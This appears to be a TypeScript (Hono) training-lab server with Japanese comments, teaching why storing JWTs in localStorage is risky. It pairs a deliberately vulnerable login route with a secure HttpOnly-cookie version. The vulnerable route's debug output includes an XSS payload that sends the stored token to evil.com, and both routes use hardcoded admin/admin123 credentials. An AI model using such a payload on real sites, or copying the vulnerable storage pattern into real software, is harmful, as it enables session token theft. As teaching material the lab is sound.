import { Hono } from "hono";

const app = new Hono();

// ========================================
// Lab: Web Storage Abuse
// localStorage/sessionStorage への機密データ保存
// ========================================

// --- 脆弱バージョン ---

// ⚠️ JWTをレスポンスボディで返す（フロントエンドがlocalStorageに保存する想定）
app.post("/vulnerable/login", async (c) => {
  const body = await c.req.json<{ username: string; password: string }>();
  const { username, password } = body;

  if (username === "admin" && password === "admin123") {
    // ⚠️ トークンをレスポンスボディで返す → フロントエンドがlocalStorageに保存
    // XSS攻撃でlocalStorage.getItem("token") で窃取可能
    const fakeJwt = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fake_signature";

    return c.json({
      success: true,
      message: "ログイン成功",
      token: fakeJwt,
      _debug: {
        message: "JWTをレスポンスボディで返却 → localStorageに保存される想定",
        risks: [
          "XSSでlocalStorage.getItem('token')でトークン窃取",
          "JavaScriptから常にアクセス可能",
          "ブラウザ間で共有される",
        ],
        xssPayload: "<script>fetch('https://evil.com?t='+localStorage.getItem('token'))</script>",
      },
    });
  }

  return c.json({ success: false, message: "認証失敗" }, 401);
});

// ⚠️ Authorization ヘッダーでトークンを送信
app.get("/vulnerable/profile", (c) => {
  const auth = c.req.header("Authorization");
  if (!auth || !auth.startsWith("Bearer ")) {
    return c.json({ success: false, message: "認証が必要です" }, 401);
  }

  return c.json({
    success: true,
    profile: { name: "admin", role: "admin" },
    _debug: { message: "Authorizationヘッダーからトークンを取得" },
  });
});

// --- 安全バージョン ---

// ✅ JWTをHttpOnly Cookieで返す
app.post("/secure/login", async (c) => {
  const body = await c.req.json<{ username: string; password: string }>();
  const { username, password } = body;

  if (username === "admin" && password === "admin123") {
    const fakeJwt = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fake_signature";

    // ✅ HttpOnly Cookie でトークンを設定（JavaScriptからアクセス不可）
    c.header("Set-Cookie", `token=${fakeJwt}; Path=/; HttpOnly; Secure; SameSite=Strict`);

    return c.json({
      success: true,
      message: "ログイン成功（トークンはHttpOnly Cookieに保存）",
      // ✅ トークンをレスポンスボディに含めない
    });
  }

  return c.json({ success: false, message: "認証失敗" }, 401);
});

// ✅ Cookie からトークンを自動送信
app.get("/secure/profile", (c) => {
  const cookie = c.req.header("Cookie");
  if (!cookie || !cookie.includes("token=")) {
    return c.json({ success: false, message: "認証が必要です" }, 401);
  }

  return c.json({
    success: true,
    profile: { name: "admin", role: "admin" },
  });
});

export default app;
